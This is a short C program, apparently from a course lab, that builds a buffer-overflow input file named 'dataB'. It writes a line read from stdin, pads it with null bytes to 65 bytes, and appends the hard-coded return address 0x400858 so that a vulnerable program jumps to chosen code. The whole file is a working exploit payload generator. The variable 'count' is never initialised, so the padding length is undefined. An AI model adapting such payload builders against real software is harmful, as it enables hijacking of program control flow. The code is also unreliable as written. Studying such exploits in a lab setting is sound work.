#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

int main(void){
    int i;
    char c;
    unsigned int uiData;
    int count;
    FILE *psFile;
    
    uiData = 0x400858;
    psFile = fopen("dataB", "w");
    
    while((c = getchar()) != '\n' && c != EOF){
        putc(c, psFile);
        count++;
    }

    for(i = 0; i < (65-count); i++){
        putc('\0', psFile);
    }
    
    fwrite(&uiData, sizeof(unsigned int), 1, psFile);
    fclose(psFile);
    
    return 0;
}
